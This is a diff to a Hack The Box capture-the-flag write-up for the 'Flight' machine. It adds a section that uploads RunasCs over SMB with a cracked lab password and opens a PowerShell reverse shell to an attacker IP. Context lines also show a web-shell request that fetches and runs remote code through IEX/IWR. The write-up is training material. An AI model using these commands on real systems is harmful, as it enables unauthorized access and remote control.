@@ -259,7 +259,7 @@ http://10.10.14.38:8000
 
 BOOM! We get my Nmap scans that are in my /HTB/Escape directory for this challenge!
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 This means that we can exploit this!
 
@@ -584,7 +584,7 @@ chisel server --reverse -p 9999
 
 Now, upon visiting 127.0.0.1:8000 on our kali box in our browser, we will see:
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Screw webshells, let's upgrade to a ConPTYShell reverse shell
 
@@ -633,6 +633,38 @@ curl http://flight.htb/hacker.php -A 'powershell.exe IEX(IWR http://10.10.14.48:
 Congrats, you have now caught a fully-interactive Windows reverse shell!
 
 <figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+### Obtaining C.Bum Session
+
+Traditional methods will not work, so we need to use <mark style="color:yellow;">RunasCs</mark>!
+
+{% embed url="https://github.com/antonioCoco/RunasCs/releases" %}
+
+Obtain, unzip, and transfer binary to target:
+
+<pre><code><strong>wget https://github.com/antonioCoco/RunasCs/releases/download/v1.4/RunasCs.zip
+</strong><strong>unzip RunasCs.zip
+</strong>smbclient '\\\\flight.htb\\Web' -I flight.htb -U C.Bum 'Tikkycoll_431012284'
+password: Tikkycoll_431012284
+cd flight.htb
+put RunasCs.exe
+exit
+</code></pre>
+
+With your svc\_apache shell, execute the following:
+
+Start nc listener:
+
+```
+bash
+nc -lnvp 9003
+```
+
+```
+.\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.48:9003
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ### PrivEsc vector
 
